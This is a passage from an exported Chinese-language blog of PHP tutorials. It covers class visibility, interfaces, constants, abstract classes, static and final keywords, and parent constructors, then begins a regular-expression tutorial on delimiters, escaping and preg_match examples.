class="title">MyProtected</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 声明一个私有的方法</span></span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">MyPrivate</span>(<span class="params"></span>) </span>&#123; &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 此方法为公有</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPrivate();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$myclass</span> = <span class="keyword">new</span> MyClass;</span><br><span class="line"> <span class="variable">$myclass</span>-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="variable">$myclass</span>-&gt;MyProtected(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="variable">$myclass</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line"> <span class="variable">$myclass</span>-&gt;Foo(); <span class="comment">// 公有，受保护，私有都可以执行</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Define MyClass2</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">MyClass2</span> <span class="keyword">extends</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="comment">// 此方法为公有</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">Foo2</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">     </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPublic();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyProtected();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;MyPrivate(); <span class="comment">// 这行会产生一个致命错误</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$myclass2</span> = <span class="keyword">new</span> MyClass2;</span><br><span class="line"> <span class="variable">$myclass2</span>-&gt;MyPublic(); <span class="comment">// 这行能被正常执行</span></span><br><span class="line"> <span class="variable">$myclass2</span>-&gt;Foo2(); <span class="comment">// 公有的和受保护的都可执行，但私有的不行</span></span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Bar</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">$this</span>-&gt;testPrivate();</span><br><span class="line">         <span class="keyword">$this</span>-&gt;testPublic();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Bar::testPublic\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Bar::testPrivate\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">extends</span> <span class="title">Bar</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">testPublic</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Foo::testPublic\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">testPrivate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;Foo::testPrivate\n&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$myFoo</span> = <span class="keyword">new</span> foo();</span><br><span class="line"> <span class="variable">$myFoo</span>-&gt;test(); <span class="comment">// Bar::testPrivate</span></span><br><span class="line"> <span class="comment">// Foo::testPublic</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>6. 接口</strong></font><br>使用<font color="#00B2EE"><strong>接口（interface）</strong></font>，可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。<br>接口是通过 interface关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。<br>接口中定义的所有方法都必须是公有，这是接口的特性。<br>要实现一个接口，使用 implements 操作符。类中必须实现接口中定义的所有方法，否则会报一个致命错误。类可以实现多个接口，用逗号来分隔多个接口的名称。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 声明一个&#x27;iTemplate&#x27;接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">iTemplate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$var</span></span>)</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span>(<span class="params"><span class="variable">$template</span></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实现接口</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> <span class="keyword">implements</span> <span class="title">iTemplate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vars</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setVariable</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vars[<span class="variable">$name</span>] = <span class="variable">$var</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHtml</span>(<span class="params"><span class="variable">$template</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;vars <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="variable">$template</span> = str_replace(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$name</span> . <span class="string">&#x27;&#125;&#x27;</span>, <span class="variable">$value</span>, <span class="variable">$template</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$template</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>7. 常量</strong></font><br>可以把在类中始终保持不变的值定义为常量。在定义和使用常量的时候不需要使用<font color="#FF7F00"> $ </font>符号。<br>常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。<br>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字（如 self，parent 或 static）。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class MyClass</span><br><span class="line"> &#123;</span><br><span class="line">     const constant = <span class="string">&#x27;常量值&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">function</span> <span class="function"><span class="title">showConstant</span></span>() &#123;</span><br><span class="line">         <span class="built_in">echo</span>  self::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> MyClass::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$classname</span> = <span class="string">&quot;MyClass&quot;</span>;</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$classname</span>::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>; // 自 5.3.0 起</span><br><span class="line"> </span><br><span class="line"> <span class="variable">$class</span> = new MyClass();</span><br><span class="line"> <span class="variable">$class</span>-&gt;showConstant();</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$class</span>::constant . <span class="string">&quot;&lt;br/&gt;&quot;</span>; // 自 PHP 5.3.0 起</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>8. 抽象类</strong></font><br>任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。<br>定义为抽象的类不能被实例化。<br>被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。<br>继承一个抽象类的时候，子类必须定义父类中的所有抽象方法；另外，这些方法的访问控制必须和父类中一样（或者更为宽松）。例如某个抽象方法被声明为受保护的，那么<br>子类中实现的方法就应该声明为受保护的或者公有的，而不能定义为私有的。此外方法的调用方式必须匹配，即类型和所需参数数量必须一致。例如，子类定义了一个可选参数，而父类抽象方法的声明里没有，则两者的声明并无冲突。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass1</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ConcreteClass1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span>(<span class="params"><span class="variable">$prefix</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$prefix&#125;</span>ConcreteClass1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ConcreteClass2</span> <span class="keyword">extends</span> <span class="title">AbstractClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;ConcreteClass2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">prefixValue</span>(<span class="params"><span class="variable">$prefix</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;<span class="subst">&#123;$prefix&#125;</span>ConcreteClass2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$class1</span> = <span class="keyword">new</span> ConcreteClass1;</span><br><span class="line"><span class="variable">$class1</span>-&gt;printOut();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class1</span>-&gt;prefixValue(<span class="string">&#x27;FOO_&#x27;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$class2</span> = <span class="keyword">new</span> ConcreteClass2;</span><br><span class="line"><span class="variable">$class2</span>-&gt;printOut();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$class2</span>-&gt;prefixValue(<span class="string">&#x27;FOO_&#x27;</span>) . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">ConcreteClass1</span><br><span class="line">FOO_ConcreteClass1</span><br><span class="line">ConcreteClass2</span><br><span class="line">FOO_ConcreteClass2</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>9. Static 关键字</strong></font><br>声明类属性或方法为 static(静态)，就可以不实例化类而直接访问。<br>静态属性不能通过一个类已实例化的对象来访问（但静态方法可以）。<br>由于静态方法不需要通过对象即可调用，所以伪变量 $this 在静态方法中不可用。<br>静态属性不可以由对象通过 -&gt; 操作符来访问。<br>自 PHP 5.3.0 起，可以用一个变量来动态调用类。但该变量的值不能为关键字 self，parent 或 static。<br></font> </p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$my_static</span> = <span class="string">&#x27;foo&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">staticValue</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$my_static</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">print</span> Foo::<span class="variable">$my_static</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$foo</span> = <span class="keyword">new</span> Foo();</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$foo</span>-&gt;staticValue() . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">foo</span><br><span class="line">foo</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>10. Final 关键字</strong></font><br>PHP 5 新增了一个 final 关键字。如果父类中的方法被声明为 final，则子类无法覆盖该方法。如果一个类被声明为 final，则不能被继承。<br></font></p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;BaseClass::test() called&quot;</span> . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">     <span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moreTesting</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;BaseClass::moreTesting() called&quot;</span>  . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">ChildClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moreTesting</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;ChildClass::moreTesting() called&quot;</span>  . PHP_EOL;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">// 报错信息 Fatal error: Cannot override final method BaseClass::moreTesting()</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">Fatal <span class="built_in">error</span>:  Cannot override <span class="keyword">final</span> method BaseClass::moreTesting() in D:\WWW\Basis\oop\opp_9.php on line <span class="number">16</span></span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br><font face="Comic sans MS"><font color="red"><strong>11.调用父类构造方法</strong></font><br>PHP 不会在子类的构造方法中自动的调用父类的构造方法。要执行父类的构造方法，需要在子类的构造方法中调用 parent::__construct()<br></font> </p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> header(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);    <span class="comment">//设置编码</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;BaseClass 类中构造方法&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="built_in">parent</span>::__construct();  <span class="comment">// 子类构造方法不能自动调用父类的构造方法</span></span><br><span class="line">         <span class="keyword">print</span> <span class="string">&quot;SubClass 类中构造方法&quot;</span> . <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">OtherSubClass</span> <span class="keyword">extends</span> <span class="title">BaseClass</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 继承 BaseClass 的构造方法</span></span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> BaseClass();</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass、SubClass 构造方法</span></span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> SubClass();</span><br><span class="line"> </span><br><span class="line"> <span class="comment">// 调用 BaseClass 构造方法</span></span><br><span class="line"> <span class="variable">$obj</span> = <span class="keyword">new</span> OtherSubClass();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">BaseClass 类中构造方法</span><br><span class="line">BaseClass 类中构造方法</span><br><span class="line">SubClass 类中构造方法</span><br><span class="line">BaseClass 类中构造方法</span><br></pre></td></tr></table></figure>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h4 id="1-9-PHP-函数"><a href="#1-9-PHP-函数" class="headerlink" title="1.9 PHP 函数"></a><font color="#3CB371" face="Comic sans MS">1.9 PHP 函数</font></h4><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-function">参见本站博客：PHP-函数</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="二、-PHP-正则表达式"><a href="#二、-PHP-正则表达式" class="headerlink" title="二、 PHP 正则表达式"></a><font color="#FF6347" face="Comic sans MS">二、 PHP 正则表达式</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-Regular-Expression">参见本站博客：PHP-正则表达式</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="三、-PHP-文件系统"><a href="#三、-PHP-文件系统" class="headerlink" title="三、 PHP 文件系统"></a><font color="#FF6347" face="Comic sans MS">三、 PHP 文件系统</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-FileSystem">参见本站博客：PHP-文件系统</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="四、-PHP-文件上传"><a href="#四、-PHP-文件上传" class="headerlink" title="四、 PHP 文件上传"></a><font color="#FF6347" face="Comic sans MS">四、 PHP 文件上传</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/PHP-Upload">参见本站博客：PHP-文件上传</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="五、-MySQL入门"><a href="#五、-MySQL入门" class="headerlink" title="五、 MySQL入门"></a><font color="#FF6347" face="Comic sans MS">五、 MySQL入门</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.github.io/post/MySQL-Primer">参见本站博客：MySQL入门</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="六、-PHP操作MySQL数据库"><a href="#六、-PHP操作MySQL数据库" class="headerlink" title="六、 PHP操作MySQL数据库"></a><font color="#FF6347" face="Comic sans MS">六、 PHP操作MySQL数据库</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.top/post/PHP-MySQL">参见本站博客：PHP操作MySQL数据库</a>]</strong></font><br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="七、-PHP会话管理和控制"><a href="#七、-PHP会话管理和控制" class="headerlink" title="七、 PHP会话管理和控制"></a><font color="#FF6347" face="Comic sans MS">七、 PHP会话管理和控制</font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>[<a href="https://directoree.top/post/PHP-SessionManagement">参见本站博客：PHP-会话管理和控制</a>]</strong></font><br></font></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP语言</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-正则表达式</title>
    <url>/post/PHP-Regular-Expression/</url>
    <content><![CDATA[<p>世界上最难懂的是道士的鬼符、医生的处方和程序员的正则表达示。(ง •_•)ง</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>PHP 正则表达式</font></center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<p><font color="red"><strong>正则表达示我们其实之前经常看到，它主要用在以下一些地方：</strong></font><br>1.匹配邮箱、手机号码、验证码<br>2.替换敏感的关键词。例如：涉及政治和骂人的话<br>3.文章采集。<br>4.早期的表情替换技术,ubb文件编码、markdown编辑器替换等<br>5.以后自己写模板引擎也需要用到正则表达示<br>其他….<br><font face="Comic sans MS"></font></p>
<blockquote>
<p>正则表达式是一种描述字符串结果的语法规则，是一个特定的格式化模式，可以匹配、替换、截取匹配的字符串。<font color="#00B2EE"><strong>常用的语言基本上都有正则表达式，如JavaScript、java</strong></font>等。其实，只有了解一种语言的正则使用，其他语言的正则使用起来，就相对简单些。文本主要围绕解决下面问题展开。</p>
</blockquote>
<hr>
<hr>
<h3 id="1-定界符"><a href="#1-定界符" class="headerlink" title="1. 定界符"></a><font color="#FF6347" face="Comic sans MS">1. 定界符</font></h3><p><font face="Comic sans MS">定界符，就是定一个边界，边界以内的就是正则表达示。<br>PHP的正则表达示定界符的规定如下：<br>定界符，<font color="#00B2EE"><strong>不能用a-zA-Z0-9\ 其他的都可以用。必须成对出现，有开始就有结束。</strong></font><br>我们来例几个例子：<br></font></p>
<table>
<thead>
<tr>
<th align="center">例子</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&#x2F;中间写正则&#x2F;</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">$中间写正则$</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">%中间写正则%</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">^中间写正则^</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">@中间写正则@</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">#中间写正则#</td>
<td align="center">正确</td>
</tr>
<tr>
<td align="center">(中间写正则)</td>
<td align="center">错误</td>
</tr>
<tr>
<td align="center">A中间写正则A</td>
<td align="center">错误</td>
</tr>
</tbody></table>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="2-转义字符"><a href="#2-转义字符" class="headerlink" title=" 2. 转义字符 "></a><font face="Comic sans MS" color="#FF6347"> 2. 转义字符 </font></h3><p><font face="Comic sans MS">注：<font color="#FF7F00">\ </font>是转义字符，如果在以后正则表达示里面需要匹配&#x2F;，如下：<br>&#x2F; &#x2F; &#x2F;<br>这个时候真要匹配&#x2F; 的时候，需要把定界符里面的&#x2F; 用转义字符转义一下，写成下面的例子：<br>&#x2F; <font color="#FF7F00">&lt;&#x2F;font&gt;&#x2F; &#x2F;<br>如果你觉得麻烦，遇到这种需要转义的字符的时候可以把两个正斜线（&#x2F; &#x2F;）定界，改为其他的定界符（# #）。<br></font></p>
<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="3-原子"><a href="#3-原子" class="headerlink" title=" 3. 原子 "></a><font face="Comic sans MS"><font color="#FF6347"> 3. 原子 </font></h3><p><font face="Comic sans MS"><font color="#00B2EE"><strong>原子</strong></font>是正则表达示里面的最小单位，原子说白了就是需要匹配的内容。一个成立的正则表达示当中必须最少要有一个原子。<br><font color="#00B2EE"><strong>所有可见不可见的字符就是原子！</strong></font><br><font color="red"><strong>说明：</strong></font>我们见到的空格、回车、换行、0-9、A-Za-z、中文、标点符号、特殊符号全为原子。<br>在做原子的实例前我们先来讲解一个函数,preg_match:<br><font color="red">int preg_match ( string $正则 , string $字符串 [, array &amp;$结果] )</font><br>功能：根据$正则变量，匹配$字符串变量。如果存在则返回匹配的个数，把匹配到的结果放到$结果变量里。如果没有匹配到结果返回0。<br><strong>注：</strong>上面是preg_match常用的主要几个参数。我在上面将另外几个参数没有列出来。因为，另外两个参数太不常用了。<br>我们来通过实验来证明：<br></font></p>
<p><font color="#FF6347">(1)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//定义一个变量叫zz，放正则表达示。为了方便大家记忆，如果你英文比较ok，建议把变量名还是写成</span><br><span class="line">//英文的<span class="variable">$pattern</span>。</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/a/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ddfdjjvi2jfvkwkfi24&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为我希望的是匹配a，而$string当是是不存在a的，所以不成功。</p>
</blockquote>
<p><font color="#FF6347">(2)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/wq/&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;ssssswqaaaaaa&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>上面的字符串中s后存在wq，因此匹配成功。</p>
</blockquote>
<p>接下来我们匹配一个空格试试：<br><font color="#FF6347">(3)↓↓</font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$zz</span> = <span class="string">&#x27;/ /&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;sssssw aaaaa&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="variable">$zz</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;匹配到了，结果为：&#x27;</span>;</span><br><span class="line">   var_dump(<span class="variable">$matches</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&#x27;没有匹配到&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">匹配到了，结果为：array(1) &#123; [0]=&gt; string(1) <span class="string">&quot; &quot;</span> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
